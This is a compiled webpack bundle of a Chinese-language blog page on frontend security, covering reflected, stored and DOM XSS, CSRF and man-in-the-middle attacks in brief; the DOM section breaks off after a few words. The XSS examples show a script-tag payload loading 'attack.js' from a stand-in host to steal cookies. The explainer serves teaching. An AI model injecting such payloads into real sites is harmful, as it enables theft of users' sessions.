"use strict";(self.webpackChunkmy_website_2=self.webpackChunkmy_website_2||[]).push([[2292],{28453:(e,n,s)=>{s.d(n,{R:()=>r,x:()=>d});var t=s(96540);const c={},i=t.createContext(c);function r(e){const n=t.useContext(i);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function d(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(c):e.components||c:r(e.components),t.createElement(i.Provider,{value:n},e.children)}},72713:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>l,contentTitle:()=>d,default:()=>a,frontMatter:()=>r,metadata:()=>t,toc:()=>o});const t=JSON.parse('{"id":"coding/network/http/fe-safeness","title":"\u524d\u7aef\u5b89\u5168","description":"1. XSS \uff08\u8de8\u7ad9\u811a\u672c\u653b\u51fb\uff09","source":"@site/docs/coding/network/http/fe-safeness.md","sourceDirName":"coding/network/http","slug":"/coding/network/http/fe-safeness","permalink":"/myblog/docs/coding/network/http/fe-safeness","draft":false,"unlisted":false,"editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/coding/network/http/fe-safeness.md","tags":[],"version":"current","frontMatter":{},"sidebar":"tutorialSidebar","previous":{"title":"URI\u3001URL\u3001URN\u3001Data URI \u548c Object URL/Blob URL","permalink":"/myblog/docs/coding/network/http/URI-URL-URN"},"next":{"title":"HTTP \u534f\u8bae\u7684\u53d1\u5c55\u5386\u53f2","permalink":"/myblog/docs/coding/network/http/http-history"}}');var c=s(74848),i=s(28453);const r={},d="\u524d\u7aef\u5b89\u5168",l={},o=[{value:"1. XSS \uff08\u8de8\u7ad9\u811a\u672c\u653b\u51fb\uff09",id:"1-xss-\u8de8\u7ad9\u811a\u672c\u653b\u51fb",level:2},{value:"1.1 \u53cd\u5c04\u578b\uff08\u975e\u6301\u4e45\u6027\uff09",id:"11-\u53cd\u5c04\u578b\u975e\u6301\u4e45\u6027",level:3},{value:"1.2 \u5b58\u50a8\u578b\uff08\u6301\u4e45\u6027\uff09",id:"12-\u5b58\u50a8\u578b\u6301\u4e45\u6027",level:3},{value:"1.3 DOM \u578b",id:"13-dom-\u578b",level:3},{value:"2. CSRF \uff08\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\uff09",id:"2-csrf-\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020",level:2},{value:"3. \u4e2d\u95f4\u4eba\u653b\u51fb\uff08MITM\uff09",id:"3-\u4e2d\u95f4\u4eba\u653b\u51fbmitm",level:2}];function h(e){const n={code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",li:"li",p:"p",ul:"ul",...(0,i.R)(),...e.components};return(0,c.jsxs)(c.Fragment,{children:[(0,c.jsx)(n.header,{children:(0,c.jsx)(n.h1,{id:"\u524d\u7aef\u5b89\u5168",children:"\u524d\u7aef\u5b89\u5168"})}),"\n",(0,c.jsx)(n.h2,{id:"1-xss-\u8de8\u7ad9\u811a\u672c\u653b\u51fb",children:"1. XSS \uff08\u8de8\u7ad9\u811a\u672c\u653b\u51fb\uff09"}),"\n",(0,c.jsx)(n.p,{children:"\u653b\u51fb\u8005\u5229\u7528\u7f51\u7ad9\u6f0f\u6d1e\u5c06\u4ee3\u7801\u6ce8\u5165\u5230\u5176\u4ed6\u7528\u6237\u6d4f\u89c8\u5668"}),"\n",(0,c.jsx)(n.h3,{id:"11-\u53cd\u5c04\u578b\u975e\u6301\u4e45\u6027",children:"1.1 \u53cd\u5c04\u578b\uff08\u975e\u6301\u4e45\u6027\uff09"}),"\n",(0,c.jsxs)(n.p,{children:["\u653b\u51fb\u8005\u901a\u8fc7\u5728 ",(0,c.jsx)(n.code,{children:"URL"})," \u63d2\u5165\u6076\u610f\u4ee3\u7801\uff0c\u5176\u4ed6\u7528\u6237\u8bbf\u95ee\u8be5\u6076\u610f\u94fe\u63a5\u65f6\uff0c\u670d\u52a1\u7aef\u5728 ",(0,c.jsx)(n.code,{children:"URL"})," \u53d6\u51fa\u6076\u610f\u4ee3\u7801\u540e\u62fc\u63a5\u81f3 ",(0,c.jsx)(n.code,{children:"HTML"})," \u4e2d\u8fd4\u56de\u7ed9\u7528\u6237\u6d4f\u89c8\u5668"]}),"\n",(0,c.jsxs)(n.ul,{children:["\n",(0,c.jsxs)(n.li,{children:["\u901a\u8fc7 ",(0,c.jsx)(n.code,{children:"URL"})," \u63d2\u5165\u6076\u610f\u4ee3\u7801"]}),"\n",(0,c.jsx)(n.li,{children:"\u6709\u670d\u52a1\u7aef\u53c2\u4e0e"}),"\n",(0,c.jsx)(n.li,{children:"\u9700\u8981\u7528\u6237\u8bbf\u95ee\u7279\u5b9a\u94fe\u63a5"}),"\n"]}),"\n",(0,c.jsxs)(n.p,{children:["\u4e3e\u4e2a\u6817\u5b50\uff1a\r\n\u653b\u51fb\u8005\u8bf1\u5bfc\u88ab\u5bb3\u8005\u6253\u5f00\u94fe\u63a5",(0,c.jsx)(n.code,{children:'olumel.top?name=<script src="http://a.com/attack.js"/>'}),", \u5982\u679c\u672a\u7ecf\u5904\u7406\u76f4\u63a5\u628a ",(0,c.jsx)(n.code,{children:"name"})," \u5b57\u6bb5\u62fc\u63a5\u5230\u524d\u7aef\u6a21\u677f\u4e2d\uff0c\u5c31\u5728\u88ab\u5bb3\u8005\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\u6267\u884c\u4e86\u653b\u51fb\u8005\u6ce8\u5165\u7684\u811a\u672c\uff08\u53ef\u4ee5\u901a\u8fc7\u6b64\u65b9\u5f0f\u83b7\u53d6",(0,c.jsx)(n.code,{children:"Cookie"}),"\u7b49\u4fe1\u606f\uff09"]}),"\n",(0,c.jsx)(n.h3,{id:"12-\u5b58\u50a8\u578b\u6301\u4e45\u6027",children:"1.2 \u5b58\u50a8\u578b\uff08\u6301\u4e45\u6027\uff09"}),"\n",(0,c.jsx)(n.p,{children:"\u653b\u51fb\u8005\u5c06\u6ce8\u5165\u578b\u811a\u672c\u63d0\u4ea4\u5230\u88ab\u653b\u51fb\u7684\u6570\u636e\u5e93\u4e2d\uff0c\u8fd9\u6837\u5176\u4ed6\u7528\u6237\u6d4f\u89c8\u6570\u636e\u65f6\uff0c\u5c31\u53ef\u4ee5\u83b7\u53d6\u5230\u670d\u52a1\u5668\u8fd4\u56de\u7684\u6ce8\u5165\u811a\u672c\u5e76\u6267\u884c"}),"\n",(0,c.jsxs)(n.ul,{children:["\n",(0,c.jsx)(n.li,{children:"\u6076\u610f\u4ee3\u7801\u5b58\u50a8\u5728\u670d\u52a1\u5668\u4e2d"}),"\n",(0,c.jsx)(n.li,{children:"\u6709\u670d\u52a1\u7aef\u53c2\u4e0e"}),"\n",(0,c.jsx)(n.li,{children:"\u53ea\u8981\u7528\u6237\u8bbf\u95ee\u4e86\u88ab\u6ce8\u5165\u6076\u610f\u811a\u672c\u7684\u5730\u5740\u5c31\u4f1a\u88ab\u653b\u51fb"}),"\n"]}),"\n",(0,c.jsxs)(n.p,{children:["\u4e3e\u4e2a\u6817\u5b50\uff1a\r\n\u653b\u51fb\u8005\u5728\u76ee\u6807\u7559\u8a00\u677f\u4e2d\u63d0\u4ea4\u4e86",(0,c.jsx)(n.code,{children:'<script src="http://a.com/attack.js"/>'}),",\u76ee\u6807\u7f51\u7ad9\u670d\u52a1\u7aef\u672a\u7ecf\u8f6c\u4e49\u5b58\u50a8\u4e86\u6076\u610f\u4ee3\u7801\uff0c\u524d\u7aef\u8bf7\u6c42\u5230\u6570\u636e\u540e\u76f4\u63a5\u901a\u8fc7",(0,c.jsx)(n.code,{children:"innerHTML"}),"\u6e32\u67d3\u5230\u9875\u9762\u4e2d\uff0c\u5176\u4ed6\u7528\u6237\u8bbf\u95ee\u7559\u8a00\u6570\u636e\u65f6\uff0c\u5c31\u4f1a\u81ea\u52a8\u6267\u884c\u6076\u610f\u811a\u672c"]}),"\n",(0,c.jsx)(n.h3,{id:"13-dom-\u578b",children:"1.3 DOM \u578b"}),"\n",(0,c.jsx)(n.p,{children:"\u653b\u51fb\u8005\u901a\u8fc7\u5728 URL"}),"\n",(0,c.jsx)(n.h2,{id:"2-csrf-\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020",children:"2. CSRF \uff08\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\uff09"}),"\n",(0,c.jsx)(n.p,{children:"\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u7528\u6237\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\uff0c\u7a83\u7528\u5176\u8eab\u4efd\u5728\u5bf9\u5e94\u7684\u7f51\u7ad9\u8fdb\u884c\u64cd\u4f5c"}),"\n",(0,c.jsx)(n.h2,{id:"3-\u4e2d\u95f4\u4eba\u653b\u51fbmitm",children:"3. \u4e2d\u95f4\u4eba\u653b\u51fb\uff08MITM\uff09"}),"\n",(0,c.jsx)(n.p,{children:"\u653b\u51fb\u8005\u4e0e\u901a\u8baf\u7684\u4e24\u7aef\u5206\u522b\u521b\u5efa\u72ec\u7acb\u7684\u8054\u7cfb\uff0c\u5728\u901a\u8baf\u4e2d\u5145\u5f53\u4e00\u4e2a\u4e2d\u95f4\u4eba\u89d2\u8272\u5bf9\u6570\u636e\u8fdb\u884c\u76d1\u542c\u3001\u62e6\u622a\u751a\u81f3\u7be1\u6539"})]})}function a(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,c.jsx)(n,{...e,children:(0,c.jsx)(h,{...e})}):h(e)}}}]);